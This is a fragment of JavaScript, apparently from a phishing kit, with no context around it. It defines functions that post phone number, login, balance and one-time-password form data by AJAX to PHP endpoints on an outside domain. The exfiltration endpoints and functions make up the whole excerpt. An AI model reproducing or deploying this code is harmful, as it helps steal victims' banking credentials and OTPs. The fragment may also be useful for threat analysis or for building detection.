function sendHp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/30x-xxx/no.php',
...
function sendLogin() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/30x-xxx/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/30x-xxx/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/30x-xxx/otp.php',
